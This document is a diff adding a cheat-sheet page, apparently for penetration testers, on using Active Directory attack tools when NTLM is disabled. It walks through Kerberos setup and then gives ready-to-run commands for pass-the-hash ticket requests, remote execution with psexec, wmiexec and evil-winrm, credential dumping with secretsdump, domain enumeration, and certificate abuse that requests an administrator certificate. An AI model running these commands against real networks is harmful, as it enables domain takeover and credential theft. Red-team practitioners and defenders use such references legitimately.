@@ -1,0 +1,142 @@
+---
+title: "NTLM Disabled Environments"
+---
+
+When NTLM authentication is blocked at the domain level, every tool that defaults to NTLM will silently fail or error out. Everything must go through Kerberos. The universal requirements are: a valid TGT or service ticket in a ccache file, FQDNs as targets (Kerberos tickets are issued for hostnames, not IPs), and a working `/etc/krb5.conf`.
+
+## Setup
+
+### krb5.conf
+
+Most Linux tools read `/etc/krb5.conf` to find the KDC. Without it, Kerberos auth will fail with `KDC not found` or `Cannot contact any KDC`.
+
+```bash wrap
+# /etc/krb5.conf
+[libdefaults]
+    default_realm = $DOMAIN
+    dns_lookup_realm = false
+    dns_lookup_kdc = true
+    forwardable = true
+    rdns = false
+
+[realms]
+    $DOMAIN = {
+        kdc = $DC_HOST
+        admin_server = $DC_HOST
+    }
+
+[domain_realm]
+    .$DOMAIN_LOWER = $DOMAIN
+    $DOMAIN_LOWER = $DOMAIN
+```
+
+### /etc/hosts
+
+Kerberos tickets bind to FQDNs. IP targets will fail even with a valid ticket.
+
+```bash wrap
+echo "$DC_IP  $DC_HOST $DOMAIN" | sudo tee -a /etc/hosts
+```
+
+### Getting a TGT
+
+```bash wrap
+# With password
+getTGT.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP
+
+# With NT hash (Pass-the-Hash → Pass-the-Key)
+getTGT.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP
+
+# With AES key
+getTGT.py $DOMAIN/$USER -aesKey $AES_KEY -dc-ip $DC_IP
+
+# With certificate (PKINIT)
+certipy auth -pfx $USER.pfx -dc-ip $DC_IP -no-hash
+
+# Set and verify
+export KRB5CCNAME=$USER.ccache
+klist
+```
+
+## Tool Reference
+
+### SMB
+
+```bash wrap
+# impacket smbclient
+smbclient.py -k -no-pass $DC_HOST
+
+# List shares then connect
+# shares
+# use Finance
+# ls
+
+# Native smbclient
+smbclient -k //DC_HOST/Finance -c 'ls'
+
+# nxc: use --use-kcache (reads KRB5CCNAME) + FQDN mandatory
+nxc smb $DC_HOST -k --use-kcache
+nxc smb $DC_HOST -k --use-kcache --shares
+nxc smb $DC_HOST -k --use-kcache -x "whoami"
+
+# Spider a share
+nxc smb $DC_HOST -k --use-kcache -M spider_plus --share Finance
+```
+
+### Remote Execution
+
+```bash wrap
+# psexec / wmiexec / smbexec / atexec: same pattern
+psexec.py -k -no-pass $DOMAIN/$USER@$DC_HOST
+wmiexec.py -k -no-pass $DOMAIN/$USER@$DC_HOST
+smbexec.py -k -no-pass $DOMAIN/$USER@$DC_HOST
+
+# WinRM
+evil-winrm -i $DC_HOST -r $DOMAIN
+# KRB5CCNAME must be set; evil-winrm picks it up automatically
+```
+
+### LDAP
+
+```bash wrap
+# bloodyAD: pass -k with ccache path
+bloodyAD -k ccache=$USER.ccache -d $DOMAIN --host $DC_HOST get writable
+
+# ldapsearch with GSSAPI (kinit first or KRB5CCNAME set)
+ldapsearch -H ldap://$DC_HOST -Y GSSAPI \
+  -b "DC=$DOMAIN,DC=local" "(objectClass=user)" sAMAccountName
+```
+
+### RPC / Other Impacket Tools
+
+```bash wrap
+# rpcclient
+rpcclient -k $DC_HOST
+rpcclient -k $DC_HOST -c "enumdomusers"
+
+# General impacket pattern: every tool accepts -k -no-pass
+secretsdump.py -k -no-pass $DOMAIN/$USER@$DC_HOST
+lookupsid.py -k -no-pass $DOMAIN/$USER@$DC_HOST
+reg.py -k -no-pass $DOMAIN/$USER@$DC_HOST query -keyName 'HKLM\SYSTEM'
+```
+
+### Certipy
+
+```bash wrap
+certipy find -u $USER@$DOMAIN -k -no-pass -dc-ip $DC_IP -vulnerable -stdout
+certipy req -u $USER@$DOMAIN -k -no-pass \
+  -dc-ip $DC_IP -target $CA_HOST -ca $CA -template $TEMPLATE -upn administrator@$DOMAIN
+```
+
+## Common Errors
+
+| Error | Cause | Fix |
+|-------|-------|-----|
+| `KDC_ERR_SKEW` / `Clock skew too great` | System clock > 5 min off from DC | `faketime -f '+Xh' bash` or sync NTP |
+| `KDC can't be contacted` | Missing or wrong `krb5.conf` | Check `/etc/krb5.conf` realms and KDC entry |
+| `No credentials cache found` | `KRB5CCNAME` not set | `export KRB5CCNAME=user.ccache` |
+| `Ticket expired` | ccache is stale | Re-run `getTGT.py` and refresh `KRB5CCNAME` |
+| `Target IP instead of FQDN` | Tool resolving to IP | Use FQDN in target, check `/etc/hosts` |
+| `nxc: STATUS_NOT_SUPPORTED` | nxc falling back to NTLM | Always pair `-k` with `--use-kcache` and FQDN |
+| `KDC_ERR_PREAUTH_FAILED` | Wrong password/hash for AS-REQ | Verify creds; try AES key if RC4 is disabled |
+| `KRB_AP_ERR_BAD_INTEGRITY` | Wrong service ticket or wrong key | Re-request ST with correct `-spn` |
